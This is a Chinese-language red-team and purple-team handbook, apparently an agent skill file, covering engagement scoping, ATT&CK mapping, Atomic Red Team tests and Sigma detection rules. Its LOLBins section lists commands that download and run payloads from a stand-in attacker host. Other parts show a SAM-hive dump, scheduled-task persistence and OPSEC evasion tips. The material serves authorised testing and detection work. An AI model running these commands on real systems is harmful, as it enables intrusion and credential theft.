---
name: red-team-engagement
description: >
  红队演练与紫队运营完整手册：覆盖红队演练全生命周期（范围界定、ROE、规划、TTP执行、报告）、
  MITRE ATT&CK 威胁仿真的 Atomic Red Team 原子测试、紫队协作方法论、检测验证流程。
  攻击侧涵盖完整 Kill Chain 执行与 ATT&CK TTP 映射；防御侧涵盖检测规则验证、
  紫队 Playbook 结构、检测覆盖率差距分析。含速查表和 MITRE ATT&CK 映射。
domain: cybersecurity
subdomain: offensive-security
tags: [red-team, purple-team, atomic-red-team, threat-emulation, mitre-attack, engagement, roe, ttp, detection-validation]
version: 2.0.0
---

# 红队演练与紫队运营 — 完整攻防手册

## 适用场景

- 规划和执行完整红队演练（Full-Scope Red Team Engagement）
- 设计紫队协作演练（攻击 + 检测同步验证）
- 使用 Atomic Red Team 进行 ATT&CK 威胁仿真测试
- 编写交战规则（ROE）和演练报告
- 验证 SOC/SIEM 检测规则覆盖率

**不适用**：渗透测试方法论（见 `network-pentest-comprehensive`）、AD 专项攻击（见 `active-directory-security`）、C2 基础设施搭建（见 `c2-infrastructure`）

## 前置条件

- 已签署红队演练授权书（SOW + ROE + 豁免协议）
- MITRE ATT&CK 框架基础理解
- 目标环境网络架构文档
- 攻击机（Kali/Commando VM）+ C2 框架许可
- SIEM/EDR 管理员权限（紫队检测验证）

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 演练规划 — 威胁建模与 ATT&CK 映射

红队演练的第一步是选择合适的威胁行为者（Threat Actor）作为仿真对象，并将其 TTP 映射到 MITRE ATT&CK 框架。

```
威胁仿真规划流程
├── Step 1: 选择威胁行为者 (APT29 / FIN7 / Lazarus / APT28)
├── Step 2: 提取 ATT&CK TTP → ATT&CK Navigator 层
├── Step 3: 规划攻击路径 → Kill Chain 时间线
├── Step 4: 映射到目标环境 → 技术可行性评估
└── Step 5: 建立 TTP 优先级矩阵 → 检测覆盖率热图
```

```bash
# 下载 ATT&CK Navigator 层模板
curl -sL https://raw.githubusercontent.com/mitre-attack/attack-navigator/master/layers/samples/apt29.json -o apt29_layer.json

# 使用 ATT&CK STIX 数据查询特定 Group 的 TTP
# 安装 attack-python-client
pip install mitreattack-python

# 查询 APT29 使用的所有技术
python3 -c "
from mitreattack.stix20 import MitreAttackData
data = MitreAttackData('enterprise-attack.json')
groups = data.get_groups()
for g in groups:
    if 'APT29' in g.get('name','') or 'Cozy Bear' in g.get('aliases',[]):
        print(f'Group: {g[\"name\"]} / {g.get(\"aliases\",[])}')
        techniques = data.get_techniques_used_by_group(g['id'])
        for t in techniques:
            print(f'  TTP: {t[\"technique\"][\"id\"]} - {t[\"technique\"][\"name\"]}')
"
```

#### 1.2 目标环境侦察规划

```bash
# OSINT 被动侦察（不触碰目标网络）
## 域名/子域名枚举
subfinder -d target.com -silent | sort -u > subs.txt
amass enum -passive -d target.com -o amass_subs.txt
cat subs.txt amass_subs.txt | sort -u > all_subs.txt

## 存活主机确认
cat all_subs.txt | httpx -silent -status-code -title -tech-detect | tee recon_httpx.txt

## 员工信息收集 (LinkedIn/GitHub)
# theHarvester -d target.com -b linkedin,google

## 公开泄露检测
# trufflehog filesystem --directory ./repos/
# gitrob target-org
```

#### 1.3 红队演练范围界定文档模板

```markdown
# 红队演练范围界定书 (SOW)

## 1. 演练目标
- 验证检测能力对 [威胁行为者名称] TTP 的覆盖率
- 评估事件响应流程在真实攻击场景下的有效性
- 测试安全控制（EDR/SIEM/防火墙）的实际防护效果

## 2. 范围
### 2.1 范围内 (In-Scope)
- 目标子网: 10.0.0.0/16, 192.168.1.0/24
- 域: corp.target.com
- 应用: *.target.com (Web)
- 用户账户: 模拟钓鱼目标 (最多 50 人)

### 2.2 范围外 (Out-of-Scope)
- 生产数据库直接操作
- 拒绝服务攻击
- 物理安全测试 (除非单独授权)
- 第三方系统

## 3. 时间窗口
- 开始: YYYY-MM-DD 08:00 UTC
- 结束: YYYY-MM-DD 18:00 UTC
- 总时长: 4 周 (2 周攻击 + 2 周报告)

## 4. 联系人
| 角色 | 姓名 | 电话 |
|------|------|------|
| 红队负责人 | ______ | ______ |
| 蓝队负责人 | ______ | ______ |
| 紧急联系人 | ______ | ______ |
| 高管发起人 | ______ | ______ |

## 5. 紧急停止 (Stop)
- 安全词: [预定义安全词]
- 触发条件: 发现真实入侵 / 不可控影响 / 系统崩溃
```

### 2. 利用与攻击

#### 2.1 交战规则（Rules of Engagement）

```
交战规则 (ROE) 关键条款
├── 授权等级
│   ├── Level 1: 被动侦察 (仅 OSINT)
│   ├── Level 2: 主动扫描 (无漏洞利用)
│   ├── Level 3: 漏洞利用 (无后渗透)
│   └── Level 4: 完整 Kill Chain (含横向移动)
│
├── 行动限制
│   ├── 禁止: DoS、数据外泄到外部服务器、修改生产数据
│   ├── 允许: 凭据窃取(仅哈希)、横向移动、权限提升
│   └── 有条件: 钓鱼(需审批)、物理访问(需陪同)
│
├── 数据处理
│   ├── 窃取的凭据 → 加密存储，演练结束后销毁
│   ├── 截获的数据 → 仅保留元数据，不保留内容
│   └── 演练日志 → 保留 90 天后安全删除
│
└── 沟通协议
    ├── 每日状态更新 (邮件)
    ├── 每周同步会议
    └── 紧急情况 → 电话 + 安全词
```

#### 2.2 Kill Chain 执行 — ATT&CK TTP 映射

```
红队 Kill Chain — 完整 ATT&CK 映射

Initial Access (TA0001)
├── T1566.001  鱼叉钓鱼 - 附件
├── T1566.002  鱼叉钓鱼 - 链接
├── T1190      利用面向公众的应用
└── T1078      有效账户

Execution (TA0002)
├── T1059.001  PowerShell
├── T1059.003  Windows Command Shell
├── T1204.002  用户执行 - 恶意文件
└── T1047      WMI

Persistence (TA0003)
├── T1053.005  计划任务
├── T1547.001  注册表运行键
├── T1136.001  创建本地账户
└── T1078.002  域账户

Privilege Escalation (TA0004)
├── T1068      利用提权漏洞
├── T1548.002  绕过 UAC
├── T1482      域信任发现
└── T1134      访问令牌操作

Defense Evasion (TA0005)
├── T1055      进程注入
├── T1562.001  禁用安全工具
├── T1070.004  文件删除
└── T1027      混淆文件/信息

Credential Access (TA0006)
├── T1003.001  LSASS 内存转储
├── T1110.003  密码喷洒
├── T1558      Kerberoasting
└── T1552.001  凭据文件

Lateral Movement (TA0008)
├── T1021.001  远程桌面协议
├── T1021.002  SMB/PSExec
├── T1570      Lateral Tool Transfer
└── T1534      内部鱼叉钓鱼

Collection (TA0009)
├── T1005      本地数据收集
├── T1039      网络共享数据收集
└── T1114.001  电子邮件收集

Exfiltration (TA0010)
├── T1041      C2 通道外泄
├── T1048.003  非对称加密外泄
└── T1567      Web 服务外泄

Command and Control (TA0011)
├── T1071.001  HTTP C2
├── T1573.002  非对称加密 C2
└── T1095      非应用层协议
```

#### 2.3 Atomic Red Team 威胁仿真

```powershell
# ============ Atomic Red Team 安装与使用 ============

# Step 1: 安装 Atomic Red Team
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/main/install-atomicredteam.ps1')
Install-AtomicRedTeam -getAtomics

# Step 2: 导入模块
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

# Step 3: 执行单个 Atomic Test
## T1059.001 - PowerShell 执行
Invoke-AtomicTest T1059.001 -TestNumbers 1

## T1053.005 - 计划任务创建
Invoke-AtomicTest T1053.005 -TestNumbers 1

## T1003.001 - LSASS 内存转储 (需要管理员权限)
Invoke-AtomicTest T1003.001 -TestNumbers 1

## T1110.003 - 密码喷洒
Invoke-AtomicTest T1110.003 -TestNumbers 1

# Step 4: 查看特定技术的所有测试
Invoke-AtomicTest T1059.001 -ShowDetails

# Step 5: 执行特定测试并指定路径
Invoke-AtomicTest T1059.001 -TestNumbers 2 -PathToAtomicsFolder "C:\AtomicRedTeam\atomics"

# Step 6: 清理
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
```

```bash
# Linux 上使用 Atomic Red Team (invoke-atomic)
# 安装
pip install invoke-atomic

# 执行测试
invoke-atomic.py -Technique T1059.004 -TestNum 1
invoke-atomic.py -Technique T1070.002 -TestNum 1   # Linux 日志删除
invoke-atomic.py -Technique T1087.001 -TestNum 1   # 账户发现
```

#### 2.4 ATT&CK 评估矩阵 — 批量测试脚本

```powershell
# batch_atomic_tests.ps1 — 按战术批量执行 Atomic 测试
# 用于紫队演练中的检测覆盖率评估

$Tests = @(
    # Initial Access
    @{TTP="T1566.001"; Test=1; Desc="Spearphishing Attachment"},
    @{TTP="T1190";     Test=1; Desc="Exploit Public App"},

    # Execution
    @{TTP="T1059.001"; Test=1; Desc="PowerShell Execution"},
    @{TTP="T1059.003"; Test=1; Desc="Windows Command Shell"},
    @{TTP="T1047";     Test=1; Desc="WMI Execution"},

    # Persistence
    @{TTP="T1053.005"; Test=1; Desc="Scheduled Task"},
    @{TTP="T1547.001"; Test=1; Desc="Registry Run Key"},

    # Privilege Escalation
    @{TTP="T1068";     Test=1; Desc="Exploit for Priv Esc"},
    @{TTP="T1548.002"; Test=1; Desc="Bypass UAC"},

    # Defense Evasion
    @{TTP="T1055";     Test=1; Desc="Process Injection"},
    @{TTP="T1070.001"; Test=1; Desc="Clear Event Logs"},

    # Credential Access
    @{TTP="T1003.001"; Test=1; Desc="LSASS Memory Dump"},
    @{TTP="T1558.001"; Test=1; Desc="Kerberoasting"},

    # Lateral Movement
    @{TTP="T1021.002"; Test=1; Desc="SMB/PSExec"},

    # Discovery
    @{TTP="T1087.001"; Test=1; Desc="Account Discovery"},
    @{TTP="T1083";     Test=1; Desc="File and Directory Discovery"}
)

$Results = @()
foreach ($t in $Tests) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try {
        Invoke-AtomicTest $t.TTP -TestNumbers $t.Test -NoExecutionLog 2>&1 | Out-Null
        $status = "SUCCESS"
    } catch {
        $status = "FAILED: $($_.Exception.Message)"
    }
    $Results += [PSCustomObject]@{
        Timestamp = $ts
        TTP       = $t.TTP
        Test      = $t.Test
        Desc      = $t.Desc
        Status    = $status
    }
    Start-Sleep -Seconds 5  # 间隔执行，便于检测验证
}

$Results | Format-Table -AutoSize
$Results | Export-Csv -Path "atomic_test_results_$(Get-Date -Format 'yyyyMMdd').csv" -NoTypeInformation
```

### 3. 工具使用

#### 3.1 Atomic Red Team 速查表

| TTP | Atomic Test 命令 | 需要权限 | 检测要点 |
|-----|-----------------|---------|---------|
| T1059.001 | `Invoke-AtomicTest T1059.001 -TestNumbers 1` | User | PowerShell 日志 (4104) |
| T1059.003 | `Invoke-AtomicTest T1059.003 -TestNumbers 1` | User | 进程创建 (4688) |
| T1047 | `Invoke-AtomicTest T1047 -TestNumbers 1` | User | WMI 事件日志 |
| T1053.005 | `Invoke-AtomicTest T1053.005 -TestNumbers 1` | Admin | 计划任务创建 (4698) |
| T1547.001 | `Invoke-AtomicTest T1547.001 -TestNumbers 1` | Admin | 注册表修改 (4657) |
| T1003.001 | `Invoke-AtomicTest T1003.001 -TestNumbers 1` | Admin/SYSTEM | LSASS 访问 (4663/4656) |
| T1558.001 | `Invoke-AtomicTest T1558.001 -TestNumbers 1` | User | Kerberos TGS 请求 (4769) |
| T1055 | `Invoke-AtomicTest T1055 -TestNumbers 1` | Admin | 进程注入 (4688) |
| T1070.001 | `Invoke-AtomicTest T1070.001 -TestNumbers 1` | Admin | 事件日志清除 (1102) |
| T1021.002 | `Invoke-AtomicTest T1021.002 -TestNumbers 1` | Admin | SMB 连接 (5140) |
| T1087.001 | `Invoke-AtomicTest T1087.001 -TestNumbers 1` | User | LDAP 查询 |
| T1068 | `Invoke-AtomicTest T1068 -TestNumbers 1` | User | 特权提升 (4672) |
| T1548.002 | `Invoke-AtomicTest T1548.002 -TestNumbers 1` | User | UAC 绕过 (4688) |
| T1110.003 | `Invoke-AtomicTest T1110.003 -TestNumbers 1` | User | 多次登录失败 (4625) |
| T1566.001 | `Invoke-AtomicTest T1566.001 -TestNumbers 1` | User | 附件下载/执行 |

#### 3.2 Caldera — 自动化对手仿真

```bash
# MITRE Caldera 安装与启动
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt

# 启动 Caldera 服务器
python3 server.py --insecure --port 8888

# 访问: https://localhost:8888
# 默认凭据: admin / admin

# 关键功能
# 1. Agents → 部署 Sandcat Agent 到目标
# 2. Adversaries → 选择预配置的对手配置文件
# 3. Operations → 启动自动化操作
# 4. Plugins → 使用 SSL/TCP/HTTP C2 通道
```

```
Caldera 对手配置文件 (Adversary Profiles)
├── APT29     → 仿真 Cozy Bear 操作
├── APT28     → 仿真 Fancy Bear 操作
├── Sandworm  → 仿真俄罗斯 GRU 操作
├── custom    → 自定义 TTP 组合
└── repeat    → 重放历史操作

Caldera Ability 示例
├── 横向移动 → copy & execute via SMB/PSExec/WMI
├── 凭据窃取 → mimikatz / hashdump / dumpcerts
├── 持久化   → 注册表键 / 计划任务 / WMI 订阅
└── 防御规避 → 日志清除 / 进程注入 / AMSI 绕过
```

#### 3.3 自定义 TTP 执行框架

```python
#!/usr/bin/env python3
"""
ttp_runner.py — 红队 TTP 执行框架
按 ATT&CK 战术顺序执行自定义 TTP 序列
"""

import subprocess, json, time, datetime
from pathlib import Path

class TTPLoader:
    def __init__(self, plan_file: str):
        self.plan = json.loads(Path(plan_file).read_text())
        self.results = []

    def run_step(self, step: dict) -> dict:
        """执行单个 TTP 步骤"""
        start = time.time()
        ts = datetime.datetime.utcnow().isoformat()
        try:
            result = subprocess.run(
                step["command"],
                shell=True,
                capture_output=True,
                text=True,
                timeout=step.get("timeout", 60)
            )
            status = "SUCCESS" if result.returncode == 0 else "FAILED"
            output = result.stdout[:500] + result.stderr[:500]
        except subprocess.TimeoutExpired:
            status = "TIMEOUT"
            output = "Command timed out"
        except Exception as e:
            status = "ERROR"
            output = str(e)

        elapsed = round(time.time() - start, 2)
        entry = {
            "timestamp": ts,
            "ttp": step["ttp"],
            "tactic": step["tactic"],
            "name": step["name"],
            "status": status,
            "elapsed_sec": elapsed,
            "output_preview": output[:200]
        }
        self.results.append(entry)
        print(f"[{status}] {step['ttp']} - {step['name']} ({elapsed}s)")
        return entry

    def run_plan(self, pause_between: int = 5):
        """按计划执行所有 TTP"""
        print(f"\n{'='*60}")
        print(f"TTP Plan: {self.plan['name']}")
        print(f"Total Steps: {len(self.plan['steps'])}")
        print(f"{'='*60}\n")

        for i, step in enumerate(self.plan["steps"], 1):
            print(f"[{i}/{len(self.plan['steps'])}] {step['tactic']} > {step['ttp']}")
            self.run_step(step)
            if i < len(self.plan["steps"]):
                time.sleep(pause_between)

        report_file = f"ttp_results_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        Path(report_file).write_text(json.dumps(self.results, indent=2))
        print(f"\nResults saved to {report_file}")
        return self.results

# TTP 计划文件示例 (plan.json)
PLAN_TEMPLATE = {
    "name": "APT29 Emulation - Phase 1",
    "steps": [
        {"ttp": "T1059.001", "tactic": "Execution", "name": "PowerShell Stager",
         "command": "powershell -nop -c \"whoami\"", "timeout": 30},
        {"ttp": "T1087.001", "tactic": "Discovery", "name": "Account Discovery",
         "command": "net user /domain", "timeout": 30},
        {"ttp": "T1018", "tactic": "Discovery", "name": "Remote System Discovery",
         "command": "net view /domain", "timeout": 60},
        {"ttp": "T1053.005", "tactic": "Persistence", "name": "Scheduled Task",
         "command": "schtasks /create /tn \"Update\" /tr cmd.exe /sc minute /mo 5", "timeout": 30},
        {"ttp": "T1003.001", "tactic": "Credential Access", "name": "LSASS Dump",
         "command": "reg save HKLM\\SAM sam.bak", "timeout": 30}
    ]
}

if __name__ == "__main__":
    import sys
    plan_file = sys.argv[1] if len(sys.argv) > 1 else "plan.json"
    runner = TTPLoader(plan_file)
    runner.run_plan(pause_between=3)
```

### 4. 绕过技术

#### 4.1 OPSEC 考虑

```
红队 OPSEC 检查清单
├── C2 通信
│   ├── 使用域前置 (Domain Fronting) 隐藏真实 C2
│   ├── 证书: 使用合法 Let's Encrypt 证书
│   ├── User-Agent: 匹配目标环境常见浏览器 UA
│   └── 流量: 模拟正常 HTTPS 通信模式
│
├── 工具特征
│   ├── 自定义编译 Mimikatz (修改二进制特征)
│   ├── 使用内存加载 (无文件落地)
│   ├── 混淆 PowerShell (-enc / Base64 / AMSI Bypass)
│   └── 时间戳: 匹配目标环境正常活动时间
│
├── 凭据管理
│   ├── 窃取的凭据 → 加密存储
│   ├── C2 密码 → 每次演练轮换
│   ├── 钓鱼模板 → 使用唯一跟踪参数
│   └── 避免在日志中留下明文凭据
│
└── 轨迹清理
    ├── 不删除日志 (演练目的是被检测到)
    ├── 但如果需要隐蔽 → 使用选择性日志清理
    ├── 演练结束后 → 完整恢复/清理
    └── 保留所有操作日志用于报告
```

#### 4.2 Living Off The Land (LOLBins)

```powershell
# ============ LOLBins — 使用系统原生工具 ============

# Certutil — 下载文件
certutil -urlcache -split -f http://c2.attacker.com/payload.bin C:\temp\payload.bin

# BitsAdmin — 后台下载
bitsadmin /transfer myjob /download /priority normal http://c2.attacker.com/tool.exe C:\temp\tool.exe

# Msiexec — 执行远程 MSI
msiexec /q /i http://c2.attacker.com/payload.msi

# Mshta — 执行 HTA Payload
mshta http://c2.attacker.com/payload.hta

# WMIC — 远程执行
wmic /node:10.0.0.5 /user:admin /password:Pass123 process call create "cmd.exe /c whoami"

# Rundll32 — 执行 DLL
rundll32.exe C:\temp\payload.dll,EntryPoint

# Forfiles — 间接执行
forfiles /p C:\Windows\System32 /m cmd.exe /c "whoami"

# MSBuild — 执行内联 C#
msbuild.exe C:\temp\payload.csproj
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 紫队演练 — 检测验证方法论

```
紫队检测验证流程
├── Phase 1: 基线建立
│   ├── 记录当前检测覆盖率 (ATT&CK Navigator 热图)
│   ├── 确认 SIEM 数据源接入状态
│   └── 确认 EDR 规则配置
│
├── Phase 2: 逐一测试
│   ├── 红队: 执行 Atomic Test (每次 1 个 TTP)
│   ├── 蓝队: 实时监控检测告警
│   ├── 记录: 检测到 / 未检测到 / 部分检测
│   └── 间隔: 每次测试间隔 3-5 分钟
│
├── Phase 3: 差距分析
│   ├── 汇总检测结果
│   ├── 标识未覆盖的 TTP
│   └── 优先级排序 (基于风险和可行性)
│
└── Phase 4: 检测工程
    ├── 编写/优化 Sigma 规则
    ├── 部署到 SIEM 并验证
    └── 重新测试确认修复
```

#### 5.2 Sigma 检测规则 — 关键 TTP

```yaml
# T1059.001 — PowerShell 可疑执行
title: Suspicious PowerShell Execution
status: production
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - 'FromBase64String'
            - 'IEX'
            - 'Invoke-Expression'
            - 'DownloadString'
            - '-nop'
            - '-noni'
            - '-w hidden'
            - '-windowstyle hidden'
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1059.001

---
# T1003.001 — LSASS 内存访问
title: LSASS Memory Access Attempt
status: production
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1410'
            - '0x1010'
            - '0x143a'
    condition: selection
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001

---
# T1070.001 — 事件日志清除
title: Event Log Cleared
status: production
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID:
            - 1102
            - 104
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1070.001

---
# T1053.005 — 可疑计划任务创建
title: Suspicious Scheduled Task Creation
status: production
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains: '/create'
    filter_legitimate:
        ParentImage|endswith:
            - '\svchost.exe'
            - '\taskeng.exe'
    condition: selection and not filter_legitimate
level: medium
tags:
    - attack.persistence
    - attack.t1053.005

---
# T1055 — 进程注入检测
title: Potential Process Injection
status: production
logsource:
    category: process_access
    product: windows
detection:
    selection:
        CallTrace|contains:
            - 'UNKNOWN'
        GrantedAccess|contains:
            - '0x1f0fff'
            - '0x1f2fff'
    filter_system:
        SourceImage|endswith:
            - '\csrss.exe'
            - '\smss.exe'
    condition: selection and not filter_system
level: high
tags:
    - attack.defense_evasion
    - attack.t1055
```

#### 5.3 检测覆盖率评估矩阵

```python
#!/usr/bin/env python3
"""
detection_coverage.py — 检测覆盖率评估工具
分析紫队演练结果，生成 ATT&CK 覆盖率报告
"""

import json
from collections import defaultdict

def analyze_coverage(results_file: str):
    results = json.loads(open(results_file).read())

    by_tactic = defaultdict(list)
    for r in results:
        by_tactic[r["tactic"]].append(r)

    print("\n" + "="*70)
    print("紫队演练 — 检测覆盖率报告")
    print("="*70)

    total = len(results)
    detected = sum(1 for r in results if r.get("detected", False))

    print(f"\n总测试数: {total}")
    print(f"检测到:   {detected}")
    print(f"未检测:   {total - detected}")
    print(f"覆盖率:   {detected/total*100:.1f}%\n")

    print("-"*70)
    print(f"{'战术':<25} {'总数':>5} {'检测':>5} {'覆盖率':>8}")
    print("-"*70)

    for tactic, tests in sorted(by_tactic.items()):
        t = len(tests)
        d = sum(1 for x in tests if x.get("detected", False))
        pct = d/t*100 if t > 0 else 0
        bar = "█" * int(pct/10) + "░" * (10 - int(pct/10))
        print(f"{tactic:<25} {t:>5} {d:>5} {pct:>6.1f}% {bar}")

    print("-"*70)

    # 未检测的 TTP
    gaps = [r for r in results if not r.get("detected", False)]
    if gaps:
        print("\n⚠ 检测缺口 (未覆盖 TTP):")
        for g in gaps:
            print(f"  - {g['ttp']}: {g['name']} [{g['tactic']}]")

if __name__ == "__main__":
    import sys
    analyze_coverage(sys.argv[1] if len(sys.argv) > 1 else "purple_team_results.json")
```

### 6. 修复方案

#### 6.1 紫队 Playbook 结构模板

```markdown
# 紫队 Playbook — [TTP ID] [TTP 名称]

## 元数据
| 字段 | 内容 |
|------|------|
| TTP ID | T1059.001 |
| 战术 | Execution |
| 平台 | Windows |
| 检测数据源 | Process Creation (4688), PowerShell Logs (4104) |
| 所需权限 | User |

## 攻击步骤
1. 攻击者通过钓鱼邮件投递 .lnk 文件
2. .lnk 执行混淆 PowerShell 命令
3. PowerShell 下载并执行第二阶段 Payload

### 攻击命令
```powershell
powershell -nop -w hidden -enc <base64_payload>
```

## 检测逻辑
### Sigma 规则
[插入 Sigma 规则]

### Splunk SPL
```spl
index=winlogs EventCode=4688 NewProcessName="*powershell*"
  (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*hidden*")
```

### Elastic EQL
```
process where process.name == "powershell.exe"
  and process.command_line : ("*-enc*", "*hidden*", "*IEX*")
```

## 检测验证步骤
1. [ ] 执行 Atomic Test T1059.001 Test #1
2. [ ] 等待 30 秒
3. [ ] 检查 SIEM 告警是否生成
4. [ ] 确认告警级别和上下文是否充分

## 检测状态
- [ ] 检测规则已部署
- [ ] 已通过紫队验证
- [ ] 已加入自动化检测管道
```

#### 6.2 红队演练报告模板

```markdown
# 红队演练最终报告

## 执行摘要
- 演练周期: [开始日期] — [结束日期]
- 演练类型: [Full-Scope / Targeted / Purple Team]
- 总体评估: [高 / 中 / 低] 风险

## 1. 演练范围与方法论
| 项目 | 描述 |
|------|------|
| 目标组织 | [客户名称] |
| 模拟威胁 | [APT29 / 自定义] |
| ATT&CK 技术 | [覆盖 X/Y 个 TTP] |
| 交战规则 | Level [1-4] |

## 2. 攻击路径摘要
### 路径 1: 钓鱼 → 横向移动 → 域控
```
用户邮件 → Office Macro → PowerShell Stager → C2 建立
  → 域侦察 → Kerberoasting → 域管凭据 → 域控接管
  → 数据收集 → 外泄模拟
```

## 3. 关键发现
| ID | 严重性 | TTP | 发现描述 | 影响 |
|----|--------|-----|---------|------|
| F-01 | Critical | T1003.001 | LSASS 保护未启用 | 域管凭据泄露 |
| F-02 | High | T1566.001 | 钓鱼成功率 30% | 初始访问可行 |
| F-03 | High | T1053.005 | 计划任务无监控 | 持久化未被检测 |
| F-04 | Medium | T1055 | EDR 未检测进程注入 | 防御规避成功 |
| F-05 | Low | T1087 | 账户枚举无告警 | 侦察未被阻止 |

## 4. 检测覆盖率分析
- 总 TTP 测试数: 15
- 成功检测数: 7 (46.7%)
- 部分检测: 3 (20.0%)
- 未检测: 5 (33.3%)

### 覆盖率热图
```
Initial Access:    ████░░░░░░ 40%
Execution:         ██████░░░░ 60%
Persistence:       ███░░░░░░░ 30%
Priv Escalation:   █████░░░░░ 50%
Defense Evasion:   ████░░░░░░ 40%
Credential Access: ██████░░░░ 60%
Lateral Movement:  ███░░░░░░░ 30%
```

## 5. 修复建议 (按优先级)
### P0 — 立即修复
1. 启用 LSA Protection (RunAsPPL) → 防止 T1003.001
2. 部署 PowerShell 日志记录 (ScriptBlock 4104) → 检测 T1059.001
3. 启用高级审计策略 (进程创建 4688 含命令行)

### P1 — 30 天内
4. 部署计划任务审计 → 检测 T1053.005
5. 配置 LSASS 进程保护规则 → 检测 T1003.001
6. 实施邮件安全网关钓鱼检测规则

### P2 — 90 天内
7. 部署网络分段限制横向移动
8. 实施 Kerberos AES 加密强制
9. 建立 SOC 检测规则持续验证流程

## 6. 附录
- ATT&CK Navigator 层文件
- Atomic Test 执行日志
- Sigma 检测规则包
- 原始操作日志
```

#### 6.3 紫队演练议程模板

```
紫队演练日 — 议程模板

时间: [日期] 09:00 - 17:00
地点: [会议室 / 虚拟]

09:00 - 09:30  开场与演练范围确认
               - ROE 回顾
               - 紧急联系确认
               - 数据源确认 (SIEM/EDR 状态)

09:30 - 10:30  Phase 1: Initial Access + Execution
               TTP: T1566.001, T1059.001, T1059.003, T1047
               红队执行 → 蓝队检测 → 记录结果

10:30 - 10:45  ☕ 休息

10:45 - 12:00  Phase 2: Persistence + Privilege Escalation
               TTP: T1053.005, T1547.001, T1068, T1548.002
               红队执行 → 蓝队检测 → 记录结果

12:00 - 13:00  🍽 午餐

13:00 - 14:30  Phase 3: Defense Evasion + Credential Access
               TTP: T1055, T1070.001, T1003.001, T1558.001
               红队执行 → 蓝队检测 → 记录结果

14:30 - 14:45  ☕ 休息

14:45 - 16:00  Phase 4: Lateral Movement + Discovery
               TTP: T1021.002, T1087.001, T1083, T1018
               红队执行 → 蓝队检测 → 记录结果

16:00 - 17:00  总结与差距分析
               - 覆盖率汇总
               - 关键检测缺口
               - 后续行动计划 (检测工程)
               - 下次演练日期确认
```

---

## 速查表

### 红队演练生命周期检查清单

```
□ Phase 1: 规划 (2-4 周)
  □ 签署 SOW / ROE / 豁免协议
  □ 选择威胁行为者并映射 ATT&CK TTP
  □ 建立攻击路径规划
  □ 准备 C2 基础设施
  □ 制作钓鱼模板/攻击载荷
  □ 配置通信渠道和安全词

□ Phase 2: 执行 (1-3 周)
  □ 初始访问尝试 (钓鱼 / 技术利用)
  □ 建立持久化
  □ 权限提升
  □ 横向移动
  □ 目标达成 (数据收集 / 域控接管)
  □ 操作日志持续记录

□ Phase 3: 报告 (1-2 周)
  □ 攻击路径详细记录
  □ 检测覆盖率分析
  □ 关键发现与修复建议
  □ ATT&CK Navigator 覆盖率热图
  □ 客户汇报会议

□ Phase 4: 清理
  □ 移除所有持久化机制
  □ 删除植入的工具和 Payload
  □ 销毁窃取的凭据
  □ 交付最终报告
```

### Atomic Red Team 命令速查

| 场景 | 命令 |
|------|------|
| 安装 | `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/main/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics` |
| 导入 | `Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force` |
| 查看详情 | `Invoke-AtomicTest T1059.001 -ShowDetails` |
| 执行测试 | `Invoke-AtomicTest T1059.001 -TestNumbers 1` |
| 清理 | `Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup` |
| 查看所有技术 | `Get-AtomicTechnique` |
| 按战术筛选 | `Get-AtomicTechnique \| Where-Object {$_.tactics -contains 'persistence'}` |
| 干跑(不执行) | `Invoke-AtomicTest T1059.001 -TestNumbers 1 -WhatIf` |

### 紫队演练角色分工

| 角色 | 职责 |
|------|------|
| 红队操作员 | 执行 Atomic Test，等待蓝队确认 |
| 蓝队分析员 | 监控 SIEM/EDR，确认是否检测到 |
| 紫队协调员 | 记录结果，控制节奏，同步双方 |
| 记录员 | 记录每个 TTP 的检测结果和时间线 |
| 观察员 | SOC 经理 / CISO (可选，学习目的) |

---

## MITRE ATT&CK 映射

| 战术 | 关键技术 (红队常用) | 检测数据源 |
|------|-------------------|-----------|
| Reconnaissance (TA0043) | T1595 主动扫描, T1598 钓鱼信息收集 | Web 日志, DNS 日志 |
| Initial Access (TA0001) | T1566 鱼叉钓鱼, T1190 利用应用, T1078 有效账户 | 邮件网关, WAF, 认证日志 |
| Execution (TA0002) | T1059 PowerShell/CMD, T1047 WMI, T1204 用户执行 | 进程创建 4688, PowerShell 4104 |
| Persistence (TA0003) | T1053 计划任务, T1547 运行键, T1136 创建账户 | 注册表审计, 4698, 4720 |
| Privilege Escalation (TA0004) | T1068 漏洞利用, T1548 绕过 UAC, T1134 令牌操作 | 4672, 进程创建 |
| Defense Evasion (TA0005) | T1055 进程注入, T1562 禁用工具, T1070 清除日志 | 1102, EDR 告警 |
| Credential Access (TA0006) | T1003 凭据转储, T1110 暴力破解, T1558 Kerberoast | 4625, 4769, LSASS 访问 |
| Discovery (TA0007) | T1087 账户发现, T1083 文件发现, T1018 系统发现 | LDAP 查询日志, 进程日志 |
| Lateral Movement (TA0008) | T1021 远程服务, T1570 工具传输, T1534 内部钓鱼 | 4624 (Type 10), SMB/WinRM 日志 |
